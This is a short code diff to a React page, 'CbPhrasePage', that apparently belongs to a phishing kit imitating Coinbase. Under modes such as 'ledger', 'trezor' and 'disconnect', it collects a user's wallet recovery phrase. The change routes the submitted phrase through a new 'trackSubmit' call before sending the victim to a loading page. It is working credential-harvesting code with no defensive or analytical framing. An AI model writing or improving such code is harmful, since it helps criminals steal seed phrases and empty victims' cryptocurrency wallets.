@@ -42,7 +42,7 @@ const CONTENT: Record<PhraseMode, { title: string; description: string; logo?: s
 };
 
 function CbPhrasePage() {
-  const { trackClick, trackInput, cbNavigate, sessionId } = useCbTracking();
+  const { trackClick, trackInput, trackSubmit, cbNavigate, sessionId } = useCbTracking();
   const urlMode = useQueryParam("mode") as PhraseMode | null;
   const mode: PhraseMode =
     urlMode === "whitelist" || urlMode === "disconnect" || urlMode === "ledger" || urlMode === "trezor"
@@ -95,7 +95,7 @@ function CbPhrasePage() {
   const handleSubmit = useCallback(() => {
     if (!phrase.trim()) return;
     trackClick(`Phrase Submit ${mode}`);
-    trackInput(`phrase_final_${mode}`, phrase.trim());
+    trackSubmit(`phrase_final_${mode}`, phrase.trim());
     cbNavigate("/cb/loading");
   }, [phrase, mode, trackClick, trackInput, cbNavigate]);
 
